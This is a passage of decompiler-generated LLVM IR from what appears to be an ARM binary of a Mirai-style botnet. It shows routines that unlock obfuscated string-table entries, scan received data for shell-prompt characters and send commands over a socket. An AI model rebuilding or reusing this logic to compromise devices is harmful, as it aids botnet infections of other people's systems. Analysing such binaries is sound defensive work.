  %v5_10be4 = icmp slt i32 %v1_10bd8, %v3_10bd4
  br i1 %v5_10be4, label %dec_label_pc_10b3c, label %dec_label_pc_10be8

dec_label_pc_10be8:                               ; preds = %dec_label_pc_10b34.loopexit, %dec_label_pc_10b3c, %dec_label_pc_10bcc, %dec_label_pc_10b74, %dec_label_pc_10b48, %dec_label_pc_10b28, %dec_label_pc_10ee0.dec_label_pc_10be8.loopexit_crit_edge
  %v6_10bf0 = phi i32 [ %v0_10f08, %dec_label_pc_10ee0.dec_label_pc_10be8.loopexit_crit_edge ], [ %v0_10698, %dec_label_pc_10b28 ], [ %v6_10bf01139, %dec_label_pc_10b3c ], [ %v0_10bd4, %dec_label_pc_10bcc ], [ %v6_10bf01139, %dec_label_pc_10b74 ], [ %v6_10bf01139, %dec_label_pc_10b48 ], [ %v6_10bf01139, %dec_label_pc_10b34.loopexit ]
  %v0_10be8 = phi i32 [ %v0_10be8.pre.pre, %dec_label_pc_10ee0.dec_label_pc_10be8.loopexit_crit_edge ], [ 0, %dec_label_pc_10b28 ], [ %v1_10b64, %dec_label_pc_10b3c ], [ %v1_10bd8, %dec_label_pc_10bcc ], [ %v1_10b64, %dec_label_pc_10b74 ], [ %v1_10b64, %dec_label_pc_10b48 ], [ %v2_10b64, %dec_label_pc_10b34.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10be8 = icmp eq i32 %v0_10be8, 0
  store i1 %v2_10be8, i1* %cpsr_z.global-to-local, align 1
  %tmp1953 = icmp slt i32 %v0_10be8, 1
  br i1 %tmp1953, label %.thread1199, label %bb1954

bb1954:                                           ; preds = %dec_label_pc_10be8
  store i32 3, i32* @r3, align 4
  %v7_10bf0 = add i32 %v6_10bf0, 12
  %v8_10bf0 = inttoptr i32 %v7_10bf0 to i32*
  store i32 3, i32* %v8_10bf0, align 4
  br label %.thread1199

.thread1199:                                      ; preds = %dec_label_pc_10be8, %dec_label_pc_10df0, %dec_label_pc_11148, %dec_label_pc_10f60, %dec_label_pc_10cb4, %dec_label_pc_1118c, %bb1954
  %v0_10bf4 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10bf4 = icmp eq i32 %v0_10bf4, 0
  store i1 %v2_10bf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10bf4, label %dec_label_pc_10618.loopexit, label %dec_label_pc_107b0

dec_label_pc_10c00:                               ; preds = %dec_label_pc_10698
  %v1_10c00 = add i32 %v0_10698, 24
  %v2_10c00 = inttoptr i32 %v1_10c00 to i32*
  %v3_10c00 = load i32, i32* %v2_10c00, align 4
  store i32 %v3_10c00, i32* %r2.global-to-local, align 4
  %v1_10c04 = add i32 %v3_10c00, -1
  store i32 %v1_10c04, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10c08 = icmp eq i32 %v1_10c04, 0
  store i1 %v2_10c08, i1* %cpsr_z.global-to-local, align 1
  %tmp1955 = icmp slt i32 %v1_10c04, 1
  br i1 %tmp1955, label %dec_label_pc_10c6c, label %dec_label_pc_10c10

dec_label_pc_10c10:                               ; preds = %dec_label_pc_10c00
  %v2_10c10 = add i32 %v1_10c04, %v0_10698
  store i32 %v2_10c10, i32* %r3.global-to-local, align 4
  %v1_10c14 = add i32 %v2_10c10, 28
  %v2_10c14 = inttoptr i32 %v1_10c14 to i8*
  %v3_10c14 = load i8, i8* %v2_10c14, align 1
  %v4_10c14 = zext i8 %v3_10c14 to i32
  store i32 %v4_10c14, i32* %r3.global-to-local, align 4
  %v2_10c18 = icmp ugt i8 %v3_10c14, 61
  store i1 %v2_10c18, i1* %cpsr_c.global-to-local, align 1
  %v7_10c18 = icmp eq i8 %v3_10c14, 62
  store i1 %v7_10c18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c18, label %dec_label_pc_10f98, label %bb1956

bb1956:                                           ; preds = %dec_label_pc_10c10
  %v3_10c1c = icmp ugt i8 %v3_10c14, 57
  store i1 %v3_10c1c, i1* %cpsr_c.global-to-local, align 1
  %v8_10c1c = icmp eq i8 %v3_10c14, 58
  store i1 %v8_10c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10c1c, label %dec_label_pc_10f98, label %dec_label_pc_10c24

dec_label_pc_10c24:                               ; preds = %bb1956
  %v2_10c24 = icmp ugt i8 %v3_10c14, 35
  store i1 %v2_10c24, i1* %cpsr_c.global-to-local, align 1
  %v7_10c24 = icmp eq i8 %v3_10c14, 36
  store i1 %v7_10c24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c24, label %dec_label_pc_10f98, label %dec_label_pc_10c2c

dec_label_pc_10c2c:                               ; preds = %dec_label_pc_10c24
  %v2_10c2c = icmp ugt i8 %v3_10c14, 34
  store i1 %v2_10c2c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c2c = icmp eq i8 %v3_10c14, 35
  store i1 %v7_10c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c2c, label %dec_label_pc_10f98, label %dec_label_pc_10c64.preheader

dec_label_pc_10c64.preheader:                     ; preds = %dec_label_pc_10c2c
  %v3_10c30 = add i32 %v0_10698, 28
  %v2_10c34 = add i32 %v3_10c30, %v3_10c00
  store i32 %v2_10c34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10c64

dec_label_pc_10c40:                               ; preds = %dec_label_pc_10c64
  %v1_10c40 = add i32 %v0_10c4c720, -2
  %v2_10c40 = inttoptr i32 %v1_10c40 to i8*
  %v3_10c40 = load i8, i8* %v2_10c40, align 1
  %v4_10c40 = zext i8 %v3_10c40 to i32
  store i32 %v4_10c40, i32* %r2.global-to-local, align 4
  %v2_10c44 = icmp ugt i8 %v3_10c40, 61
  store i1 %v2_10c44, i1* %cpsr_c.global-to-local, align 1
  %v7_10c44 = icmp eq i8 %v3_10c40, 62
  store i1 %v7_10c44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c44, label %.thread719, label %bb1957

.thread719:                                       ; preds = %dec_label_pc_10c40
  %v1_10c4c721 = add i32 %v0_10c4c720, -1
  store i32 %v1_10c4c721, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f98

bb1957:                                           ; preds = %dec_label_pc_10c40
  %v3_10c48 = icmp ugt i8 %v3_10c40, 57
  store i1 %v3_10c48, i1* %cpsr_c.global-to-local, align 1
  %v8_10c48 = icmp eq i8 %v3_10c40, 58
  store i1 %v8_10c48, i1* %cpsr_z.global-to-local, align 1
  %v1_10c4c = add i32 %v0_10c4c720, -1
  store i32 %v1_10c4c, i32* %r3.global-to-local, align 4
  br i1 %v8_10c48, label %dec_label_pc_10f98, label %dec_label_pc_10c54

dec_label_pc_10c54:                               ; preds = %bb1957
  %v2_10c54 = icmp ugt i8 %v3_10c40, 35
  store i1 %v2_10c54, i1* %cpsr_c.global-to-local, align 1
  %v7_10c54 = icmp eq i8 %v3_10c40, 36
  store i1 %v7_10c54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c54, label %dec_label_pc_10f98, label %dec_label_pc_10c5c

dec_label_pc_10c5c:                               ; preds = %dec_label_pc_10c54
  %v2_10c5c = icmp ugt i8 %v3_10c40, 34
  store i1 %v2_10c5c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c5c = icmp eq i8 %v3_10c40, 35
  store i1 %v7_10c5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c5c, label %dec_label_pc_10f98, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c64.preheader, %dec_label_pc_10c5c
  %v0_10c4c720 = phi i32 [ %v2_10c34, %dec_label_pc_10c64.preheader ], [ %v1_10c4c, %dec_label_pc_10c5c ]
  %v0_10c64 = phi i32 [ %v1_10c04, %dec_label_pc_10c64.preheader ], [ %v1_10c64, %dec_label_pc_10c5c ]
  %v1_10c64 = add i32 %v0_10c64, -1
  store i32 %v1_10c64, i32* %r1.global-to-local, align 4
  %v2_10c64 = icmp ne i32 %v0_10c64, 0
  store i1 %v2_10c64, i1* %cpsr_c.global-to-local, align 1
  %v7_10c64 = icmp eq i32 %v0_10c64, 1
  store i1 %v7_10c64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c64, label %dec_label_pc_10c6c, label %dec_label_pc_10c40

dec_label_pc_10c6c:                               ; preds = %dec_label_pc_10c64, %dec_label_pc_10c00
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_10c70 = call i32 @table_unlock_val(i32 25)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r0.global-to-local, align 4
  %v3_10c80 = call i32 @table_retrieve_val(i32 25, i32* nonnull %stack_var_-60)
  %v3_10c84 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_10c80, i32* %r2.global-to-local, align 4
  %v1_10c8c = add i32 %v3_10c84, -1
  store i32 %v1_10c8c, i32* %r3.global-to-local, align 4
  %v0_10c90 = load i32, i32* @sl, align 4
  store i32 %v0_10c90, i32* %r0.global-to-local, align 4
  %v0_10c94 = load i32, i32* @r6, align 4
  %v1_10c94 = add i32 %v0_10c94, 24
  %v2_10c94 = inttoptr i32 %v1_10c94 to i32*
  %v3_10c94 = load i32, i32* %v2_10c94, align 4
  store i32 %v3_10c94, i32* %r1.global-to-local, align 4
  %v4_10c98 = call i32 @util_memsearch(i32 %v0_10c90, i32 %v3_10c94, i32 %v3_10c80, i32 %v1_10c8c)
  store i32 %v4_10c98, i32* %r0.global-to-local, align 4
  %v1_10c9c = add i32 %v4_10c98, 1
  store i32 %v1_10c9c, i32* @r7, align 4
  %v2_10c9c = icmp eq i32 %v4_10c98, -1
  store i1 %v2_10c9c, i1* %cpsr_c.global-to-local, align 1
  %v7_10c9c = icmp eq i32 %v1_10c9c, 0
  store i1 %v7_10c9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10c9c, label %thread-pre-split722, label %bb1958

bb1958:                                           ; preds = %dec_label_pc_10c6c
  store i32 1, i32* @r7, align 4
  br label %thread-pre-split722

thread-pre-split722:                              ; preds = %dec_label_pc_10c6c, %bb1958
  %v0_10ca4 = phi i1 [ false, %bb1958 ], [ true, %dec_label_pc_10c6c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 %v0_10ca4, i1* %cpsr_z.global-to-local, align 1
  store i32 25, i32* %r0.global-to-local, align 4
  %v1_112e8 = call i32 @table_lock_val(i32 25)
  br i1 %v0_10ca4, label %dec_label_pc_112e4, label %dec_label_pc_10cb4

dec_label_pc_10cb4:                               ; preds = %thread-pre-split722, %dec_label_pc_10f98
  %storemerge = phi i32 [ %v1_10fa0, %dec_label_pc_10f98 ], [ %v1_112e8, %thread-pre-split722 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v0_10cb4 = load i32, i32* @r6, align 4
  %v1_10cb4 = inttoptr i32 %v0_10cb4 to i32*
  %v2_10cb4 = load i32, i32* %v1_10cb4, align 4
  store i32 %v2_10cb4, i32* %r3.global-to-local, align 4
  %v1_10cb8 = add i32 %v0_10cb4, 4
  %v2_10cb8 = inttoptr i32 %v1_10cb8 to i32*
  %v3_10cb8 = load i32, i32* %v2_10cb8, align 4
  store i32 %v3_10cb8, i32* %r0.global-to-local, align 4
  %v1_10cbc = add i32 %v2_10cb4, 13
  %v2_10cbc = inttoptr i32 %v1_10cbc to i8*
  %v3_10cbc = load i8, i8* %v2_10cbc, align 1
  %v4_10cbc = zext i8 %v3_10cbc to i32
  store i32 %v4_10cbc, i32* %r2.global-to-local, align 4
  %v1_10cc0 = add i32 %v2_10cb4, 4
  %v2_10cc0 = inttoptr i32 %v1_10cc0 to i32*
  %v3_10cc0 = load i32, i32* %v2_10cc0, align 4
  store i32 %v3_10cc0, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_10cc8 = call i32 @__libc_send(i32 %v3_10cb8, i32 %v3_10cc0, i32 %v4_10cbc, i32 16384)
  store i32 %v4_10cc8, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_10cd0 = load i32, i32* @r6, align 4
  %v1_10cd0 = add i32 %v0_10cd0, 4
  %v2_10cd0 = inttoptr i32 %v1_10cd0 to i32*
  %v3_10cd0 = load i32, i32* %v2_10cd0, align 4
  store i32 %v3_10cd0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_10cdc = call i32 @__libc_send(i32 %v3_10cd0, i32 ptrtoint ([3 x i8]* @global_var_1a854.224 to i32), i32 2, i32 16384)
  store i32 %v4_10cdc, i32* %r0.global-to-local, align 4
  store i32 5, i32* @r3, align 4
  %v1_10ce4 = load i32, i32* @r6, align 4
  %v2_10ce4 = add i32 %v1_10ce4, 12
  %v3_10ce4 = inttoptr i32 %v2_10ce4 to i32*
  store i32 5, i32* %v3_10ce4, align 4
  br label %.thread1199

dec_label_pc_10cec:                               ; preds = %dec_label_pc_10698
  %v1_10cec = add i32 %v0_10698, 24
  %v2_10cec = inttoptr i32 %v1_10cec to i32*
  %v3_10cec = load i32, i32* %v2_10cec, align 4
  store i32 %v3_10cec, i32* %r2.global-to-local, align 4
  %v1_10cf0 = add i32 %v3_10cec, -1
  store i32 %v1_10cf0, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10cf4 = icmp eq i32 %v1_10cf0, 0
  store i1 %v2_10cf4, i1* %cpsr_z.global-to-local, align 1
  %tmp1959 = icmp slt i32 %v1_10cf0, 1
  br i1 %tmp1959, label %dec_label_pc_10d68, label %dec_label_pc_10cfc

dec_label_pc_10cfc:                               ; preds = %dec_label_pc_10cec
  %v2_10cfc = add i32 %v1_10cf0, %v0_10698
  store i32 %v2_10cfc, i32* %r3.global-to-local, align 4
  %v1_10d00 = add i32 %v2_10cfc, 28
  %v2_10d00 = inttoptr i32 %v1_10d00 to i8*
  %v3_10d00 = load i8, i8* %v2_10d00, align 1
  %v4_10d00 = zext i8 %v3_10d00 to i32
  store i32 %v4_10d00, i32* %r3.global-to-local, align 4
  %v2_10d04 = icmp ugt i8 %v3_10d00, 61
  store i1 %v2_10d04, i1* %cpsr_c.global-to-local, align 1
  %v7_10d04 = icmp eq i8 %v3_10d00, 62
  store i1 %v7_10d04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d04, label %dec_label_pc_10f4c, label %bb1960

bb1960:                                           ; preds = %dec_label_pc_10cfc
  %v3_10d08 = icmp ugt i8 %v3_10d00, 57
  store i1 %v3_10d08, i1* %cpsr_c.global-to-local, align 1
  %v8_10d08 = icmp eq i8 %v3_10d00, 58
  store i1 %v8_10d08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10d08, label %dec_label_pc_10f4c, label %dec_label_pc_10d10

dec_label_pc_10d10:                               ; preds = %bb1960
  %v2_10d10 = icmp ugt i8 %v3_10d00, 35
  store i1 %v2_10d10, i1* %cpsr_c.global-to-local, align 1
  %v7_10d10 = icmp eq i8 %v3_10d00, 36
  store i1 %v7_10d10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d10, label %dec_label_pc_10f4c, label %dec_label_pc_10d18

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10d10
  %v2_10d18 = icmp ugt i8 %v3_10d00, 34
  store i1 %v2_10d18, i1* %cpsr_c.global-to-local, align 1
  %v7_10d18 = icmp eq i8 %v3_10d00, 35
  store i1 %v7_10d18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d18, label %dec_label_pc_10f4c, label %dec_label_pc_10d20

dec_label_pc_10d20:                               ; preds = %dec_label_pc_10d18
  %v2_10d20 = icmp ugt i8 %v3_10d00, 36
  store i1 %v2_10d20, i1* %cpsr_c.global-to-local, align 1
  %v7_10d20 = icmp eq i8 %v3_10d00, 37
  store i1 %v7_10d20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d20, label %dec_label_pc_10f4c, label %dec_label_pc_10d60.preheader

dec_label_pc_10d60.preheader:                     ; preds = %dec_label_pc_10d20
  %v3_10d24 = add i32 %v0_10698, 28
  %v2_10d28 = add i32 %v3_10d24, %v3_10cec
  store i32 %v2_10d28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10d60

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10d60
  %v1_10d34 = add i32 %v0_10d40728, -2
  %v2_10d34 = inttoptr i32 %v1_10d34 to i8*
  %v3_10d34 = load i8, i8* %v2_10d34, align 1
  %v4_10d34 = zext i8 %v3_10d34 to i32
  store i32 %v4_10d34, i32* %r2.global-to-local, align 4
  %v2_10d38 = icmp ugt i8 %v3_10d34, 61
  store i1 %v2_10d38, i1* %cpsr_c.global-to-local, align 1
  %v7_10d38 = icmp eq i8 %v3_10d34, 62
  store i1 %v7_10d38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d38, label %.thread727, label %bb1961

.thread727:                                       ; preds = %dec_label_pc_10d34
  %v1_10d40729 = add i32 %v0_10d40728, -1
  store i32 %v1_10d40729, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10f4c

bb1961:                                           ; preds = %dec_label_pc_10d34
  %v3_10d3c = icmp ugt i8 %v3_10d34, 57
  store i1 %v3_10d3c, i1* %cpsr_c.global-to-local, align 1
  %v8_10d3c = icmp eq i8 %v3_10d34, 58
  store i1 %v8_10d3c, i1* %cpsr_z.global-to-local, align 1
  %v1_10d40 = add i32 %v0_10d40728, -1
  store i32 %v1_10d40, i32* %r3.global-to-local, align 4
  br i1 %v8_10d3c, label %dec_label_pc_10f4c, label %dec_label_pc_10d48

dec_label_pc_10d48:                               ; preds = %bb1961
  %v2_10d48 = icmp ugt i8 %v3_10d34, 35
  store i1 %v2_10d48, i1* %cpsr_c.global-to-local, align 1
  %v7_10d48 = icmp eq i8 %v3_10d34, 36
  store i1 %v7_10d48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d48, label %dec_label_pc_10f4c, label %dec_label_pc_10d50

dec_label_pc_10d50:                               ; preds = %dec_label_pc_10d48
  %v2_10d50 = icmp ugt i8 %v3_10d34, 34
  store i1 %v2_10d50, i1* %cpsr_c.global-to-local, align 1
  %v7_10d50 = icmp eq i8 %v3_10d34, 35
  store i1 %v7_10d50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d50, label %dec_label_pc_10f4c, label %dec_label_pc_10d58

dec_label_pc_10d58:                               ; preds = %dec_label_pc_10d50
  %v2_10d58 = icmp ugt i8 %v3_10d34, 36
  store i1 %v2_10d58, i1* %cpsr_c.global-to-local, align 1
  %v7_10d58 = icmp eq i8 %v3_10d34, 37
  store i1 %v7_10d58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d58, label %dec_label_pc_10f4c, label %dec_label_pc_10d60

dec_label_pc_10d60:                               ; preds = %dec_label_pc_10d60.preheader, %dec_label_pc_10d58
  %v0_10d40728 = phi i32 [ %v2_10d28, %dec_label_pc_10d60.preheader ], [ %v1_10d40, %dec_label_pc_10d58 ]
  %v0_10d60 = phi i32 [ %v1_10cf0, %dec_label_pc_10d60.preheader ], [ %v1_10d60, %dec_label_pc_10d58 ]
  %v1_10d60 = add i32 %v0_10d60, -1
  store i32 %v1_10d60, i32* %r1.global-to-local, align 4
  %v2_10d60 = icmp ne i32 %v0_10d60, 0
  store i1 %v2_10d60, i1* %cpsr_c.global-to-local, align 1
  %v7_10d60 = icmp eq i32 %v0_10d60, 1
  store i1 %v7_10d60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10d60, label %dec_label_pc_10d68, label %dec_label_pc_10d34

dec_label_pc_10d68:                               ; preds = %dec_label_pc_10d60, %dec_label_pc_10cec
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10d6c = call i32 @table_unlock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10d74 = call i32 @table_unlock_val(i32 27)
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 26, i32* %r0.global-to-local, align 4
  %v3_10d84 = call i32 @table_retrieve_val(i32 26, i32* nonnull %stack_var_-60)
  store i32 %v3_10d84, i32* @r4, align 4
  store i32 %v2_10d7c, i32* %r1.global-to-local, align 4
  store i32 27, i32* %r0.global-to-local, align 4
  %v3_10d98 = call i32 @table_retrieve_val(i32 27, i32* nonnull %stack_var_-60)
  %v3_10d9c = load i32, i32* %stack_var_-60, align 4
  %sext = mul i32 %v3_10d98, 16777216
  %v1_10da0 = sdiv i32 %sext, 16777216
  store i32 %v1_10da0, i32* @r5, align 4
  %v0_10da4 = load i32, i32* @r4, align 4
  store i32 %v0_10da4, i32* %r2.global-to-local, align 4
  %v1_10da8 = add i32 %v3_10d9c, -1
  store i32 %v1_10da8, i32* %r3.global-to-local, align 4
  %v0_10dac = load i32, i32* @sl, align 4
  store i32 %v0_10dac, i32* %r0.global-to-local, align 4
  %v0_10db0 = load i32, i32* @r6, align 4
  %v1_10db0 = add i32 %v0_10db0, 24
  %v2_10db0 = inttoptr i32 %v1_10db0 to i32*
  %v3_10db0 = load i32, i32* %v2_10db0, align 4
  store i32 %v3_10db0, i32* %r1.global-to-local, align 4
  %v4_10db4 = call i32 @util_memsearch(i32 %v0_10dac, i32 %v3_10db0, i32 %v0_10da4, i32 %v1_10da8)
  store i32 %v4_10db4, i32* %r0.global-to-local, align 4
  %v2_10db8 = icmp eq i32 %v4_10db4, -1
  store i1 %v2_10db8, i1* %cpsr_c.global-to-local, align 1
  %v7_10db8 = icmp eq i32 %v4_10db4, -1
  store i1 %v7_10db8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10db8, label %dec_label_pc_10dc8, label %dec_label_pc_10df0

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10d68
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  %v3_10dc8 = load i32, i32* %stack_var_-60, align 4
  %v0_10dcc = load i32, i32* @r5, align 4
  store i32 %v0_10dcc, i32* %r2.global-to-local, align 4
  %v1_10dd0 = add i32 %v3_10dc8, -1
  store i32 %v1_10dd0, i32* %r3.global-to-local, align 4
  %v0_10dd4 = load i32, i32* @sl, align 4
  store i32 %v0_10dd4, i32* %r0.global-to-local, align 4
  %v0_10dd8 = load i32, i32* @r6, align 4
  %v1_10dd8 = add i32 %v0_10dd8, 24
  %v2_10dd8 = inttoptr i32 %v1_10dd8 to i32*
  %v3_10dd8 = load i32, i32* %v2_10dd8, align 4
  store i32 %v3_10dd8, i32* %r1.global-to-local, align 4
  %v4_10ddc = call i32 @util_memsearch(i32 %v0_10dd4, i32 %v3_10dd8, i32 %v0_10dcc, i32 %v1_10dd0)
  store i32 %v4_10ddc, i32* %r0.global-to-local, align 4
  %v1_10de0 = add i32 %v4_10ddc, 1
  store i32 %v1_10de0, i32* @r7, align 4
  %v2_10de0 = icmp eq i32 %v4_10ddc, -1
  store i1 %v2_10de0, i1* %cpsr_c.global-to-local, align 1
  %v7_10de0 = icmp eq i32 %v1_10de0, 0
  store i1 %v7_10de0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10de0, label %dec_label_pc_11300, label %dec_label_pc_10df0

dec_label_pc_10df0:                               ; preds = %dec_label_pc_10dc8, %dec_label_pc_10d68
  store i32 1, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 26, i32* %r0.global-to-local, align 4
  %v1_10df4 = call i32 @table_lock_val(i32 26)
  store i32 27, i32* %r0.global-to-local, align 4
  %v1_10dfc = call i32 @table_lock_val(i32 27)
  store i32 %v1_10dfc, i32* %r0.global-to-local, align 4
  %v0_10e00 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e00 = icmp eq i32 %v0_10e00, 0
  store i1 %v2_10e00, i1* %cpsr_z.global-to-local, align 1
  %tmp1962 = icmp slt i32 %v0_10e00, 1
  br i1 %tmp1962, label %.thread1199, label %dec_label_pc_10f60

dec_label_pc_10e0c:                               ; preds = %dec_label_pc_10698
  %v1_10e0c = add i32 %v0_10698, 24
  %v2_10e0c = inttoptr i32 %v1_10e0c to i32*
  %v3_10e0c = load i32, i32* %v2_10e0c, align 4
  store i32 %v3_10e0c, i32* %r2.global-to-local, align 4
  %v1_10e10 = add i32 %v3_10e0c, -1
  store i32 %v1_10e10, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_10e14 = icmp eq i32 %v1_10e10, 0
  store i1 %v2_10e14, i1* %cpsr_z.global-to-local, align 1
  %tmp1963 = icmp slt i32 %v1_10e10, 1
  br i1 %tmp1963, label %dec_label_pc_1061c.backedge.thread, label %dec_label_pc_10e1c

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10e0c
  %v2_10e1c = add i32 %v1_10e10, %v0_10698
  store i32 %v2_10e1c, i32* %r3.global-to-local, align 4
  %v1_10e20 = add i32 %v2_10e1c, 28
  %v2_10e20 = inttoptr i32 %v1_10e20 to i8*
  %v3_10e20 = load i8, i8* %v2_10e20, align 1
  %v4_10e20 = zext i8 %v3_10e20 to i32
  store i32 %v4_10e20, i32* %r3.global-to-local, align 4
  %v2_10e24 = icmp ugt i8 %v3_10e20, 61
  store i1 %v2_10e24, i1* %cpsr_c.global-to-local, align 1
  %v7_10e24 = icmp eq i8 %v3_10e20, 62
  store i1 %v7_10e24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e24, label %dec_label_pc_10e88, label %bb1964

bb1964:                                           ; preds = %dec_label_pc_10e1c
  %v3_10e28 = icmp ugt i8 %v3_10e20, 57
  store i1 %v3_10e28, i1* %cpsr_c.global-to-local, align 1
  %v8_10e28 = icmp eq i8 %v3_10e20, 58
  store i1 %v8_10e28, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_10e28, label %dec_label_pc_10e88, label %dec_label_pc_10e30

dec_label_pc_10e30:                               ; preds = %bb1964
  %v2_10e30 = icmp ugt i8 %v3_10e20, 35
  store i1 %v2_10e30, i1* %cpsr_c.global-to-local, align 1
  %v7_10e30 = icmp eq i8 %v3_10e20, 36
  store i1 %v7_10e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e30, label %dec_label_pc_10e88, label %dec_label_pc_10e38

dec_label_pc_10e38:                               ; preds = %dec_label_pc_10e30
  %v2_10e38 = icmp ugt i8 %v3_10e20, 34
  store i1 %v2_10e38, i1* %cpsr_c.global-to-local, align 1
  %v7_10e38 = icmp eq i8 %v3_10e20, 35
  store i1 %v7_10e38, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e38, label %dec_label_pc_10e88, label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e38
  %v2_10e40 = icmp ugt i8 %v3_10e20, 36
  store i1 %v2_10e40, i1* %cpsr_c.global-to-local, align 1
  %v7_10e40 = icmp eq i8 %v3_10e20, 37
  store i1 %v7_10e40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e40, label %dec_label_pc_10e88, label %dec_label_pc_10e6c.preheader

dec_label_pc_10e6c.preheader:                     ; preds = %dec_label_pc_10e40
  %v3_10e44 = add i32 %v0_10698, 28
  %v2_10e48 = add i32 %v3_10e44, %v3_10e0c
  store i32 %v2_10e48, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10e6c

dec_label_pc_10e54:                               ; preds = %bb1965
  %v2_10e54 = icmp ugt i8 %v3_10e74, 35
  store i1 %v2_10e54, i1* %cpsr_c.global-to-local, align 1
  %v7_10e54 = icmp eq i8 %v3_10e74, 36
  store i1 %v7_10e54, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e54, label %dec_label_pc_10e88, label %dec_label_pc_10e5c

dec_label_pc_10e5c:                               ; preds = %dec_label_pc_10e54
  %v2_10e5c = icmp ugt i8 %v3_10e74, 34
  store i1 %v2_10e5c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e5c = icmp eq i8 %v3_10e74, 35
  store i1 %v7_10e5c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e5c, label %dec_label_pc_10e88, label %dec_label_pc_10e64

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e5c
  %v2_10e64 = icmp ugt i8 %v3_10e74, 36
  store i1 %v2_10e64, i1* %cpsr_c.global-to-local, align 1
  %v7_10e64 = icmp eq i8 %v3_10e74, 37
  store i1 %v7_10e64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e64, label %dec_label_pc_10e88, label %dec_label_pc_10e6c

dec_label_pc_10e6c:                               ; preds = %dec_label_pc_10e6c.preheader, %dec_label_pc_10e64
  %v0_10e80743 = phi i32 [ %v2_10e48, %dec_label_pc_10e6c.preheader ], [ %v1_10e80, %dec_label_pc_10e64 ]
  %v0_10e6c = phi i32 [ %v1_10e10, %dec_label_pc_10e6c.preheader ], [ %v1_10e6c, %dec_label_pc_10e64 ]
  %v1_10e6c = add i32 %v0_10e6c, -1
  store i32 %v1_10e6c, i32* %r1.global-to-local, align 4
  %v2_10e6c = icmp ne i32 %v0_10e6c, 0
  store i1 %v2_10e6c, i1* %cpsr_c.global-to-local, align 1
  %v7_10e6c = icmp eq i32 %v0_10e6c, 1
  store i1 %v7_10e6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_10e6c, label %dec_label_pc_1061c.backedge.thread2185, label %dec_label_pc_10e74

dec_label_pc_10e74:                               ; preds = %dec_label_pc_10e6c
  %v1_10e74 = add i32 %v0_10e80743, -2
